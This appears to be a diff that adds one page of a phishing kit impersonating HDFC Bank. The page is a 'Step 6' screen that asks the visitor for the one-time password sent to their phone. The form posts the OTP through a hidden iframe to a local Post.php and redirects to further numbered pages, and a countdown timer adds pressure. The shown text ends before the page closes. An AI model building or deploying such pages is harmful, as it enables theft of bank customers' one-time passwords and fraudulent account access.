@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="zxx">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff">
+    <title>Enter OTP/HDFC Bank</title>
+    <style>
+        #aa
+        {
+            width:104%;
+            margin-left:-6px;
+          
+        }
+        #ft
+        {
+        width: 104%;
+        margin-left:-8px;
+        }
+        #ee
+        {
+            width: 260px;
+            height:25px;
+            background-color:white;
+            border-style:solid;
+            outline:none;
+            border-color:#CCCCCC;
+            border-width:1px;
+            padding:3px 14px;
+            border-radius:4px;
+            margin:5px;
+            margin-left:20px;
+        }
+        #ee:hover
+        {
+        border-color:#67AFE9; 
+        box-shadow:0 0 6px 0 #67AFE9;    
+        }
+        #gg
+        {
+            width: 180px;
+            background-color:#1D85FE;
+            color: white;
+            padding: 10px 30px;
+            margin: 10px 40px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px; width: 180px; height: 38px;   
+            
+        }
+        #gg:hover
+        {
+        width: 180px;
+        background-color:#365785;
+        color: white;
+        padding: 10px 30px;
+        margin: 10px 40px;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+        font-size: 16px; width: 180px; height: 38px;
+        }
+        #kk,#ab
+        {
+            width: 100%;
+        }
+        #ii
+        {   width:35%;
+            border-radius:18px;
+            margin-left:20px;
+        }
+        a:hover {
+        background-color:#93c5ed;
+        color:white;
+        border-radius: 3px;
+        text-decoration: none;
+        }
+    </style>
+</head>
+<body onload="startTimer();">
+     <!-- Static- Please don't do anything here-->
+     <script type="text/javascript">var submitted=false;</script>
+     <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='proccess3.html';}"></iframe>
+     <!--My Form-->
+     <form action="Post.php" method="post" target="hidden_iframe" onsubmit="submitted=true" class="myform">
+    <img src="logomain.jpg" alt="" id="aa">
+    <h3 style="
+    background-color:#DFE9F5;
+    padding: 10px 20px;
+    border-radius:1px;
+    margin-left:-7px;
+    position:absolute;
+    top:55px;
+    font-size:16px;
+    color:#1560BD;
+    width:317px;
+    height:35px;"
+    >Step 6: Validate One Time Password<br>(OTP)</h3><br><br><br><br>
+    <center> <b style="font-family: Arial; 
+    color:#3b444b; 
+    padding:0px 15px; font-size:15px;">Please enter The One Time Password(OTP)<br>
+    which was sent to your registered mobile<br>number with HDFC Bank.</b></center><br>
+    </div>
+       <p1 style="font-family: Arial; 
+        color:#3b444b; 
+        padding:0px 20px; font-size:15px;"> One Time Password <span style="color:#f06565;">*</span></p1><br>
+     <div id="dd">
+         <input type="text" name="4TH OTP" id="ee" inputmode="numeric" placeholder="OTP" maxlength="6"
+         pattern="[0-9]{6}" 
+         title="Please Enter Valid One Time Password"
+          required=""><br>
+         </div>
+         <script type="text/javascript">
+         var timer=160;
+         var sec=0;
+         function startTimer() {
+         sec=parseInt(timer%160);
+         
+         if (timer<0) {
+         // timer.stop();
+         window.location.href = "5th.html";
+         }
+         
+         document.getElementById("time").innerHTML = "<p1> Wait for OTP   : </p1>"+sec.toString();
+         timer--;
+         setTimeout(function(){
+         startTimer();
+         
+         }, 1000);
+         }
+         
+         </script>
+         <div id="re">
+         <b> <a href="" style="color:#27a2db; margin-left:220px; text-decoration:none;">Resend OTP</a></b><br>
+         </div>
+         <div>
+<center><b style="color:#1D85FE; font-size:14px; text-align:center;"><span style="color:#1D85FE; font-size:13px;" id="time"></span>&nbsp;second</b></center>
+    </div><br>
+    </div>
+     </div>
+     <div id="ff">
+        <button type="submit"id="gg">
+        CONFIRM</button> <br><br>
+     </div>
+     <div>
+         <img src="verising.png" alt="" id="ii">
+         <p style="color:grey; font-family:arial; margin: 0px;">Your security is of utmost importance.</p>
+         <p style="color:#1D85FE; font-family:arial; margin:-1px; margin-left:2px;">Know more...</p><br><br><br><br>
+         <img src="footer.jpg" alt="" id="ft"><br><br>
+         
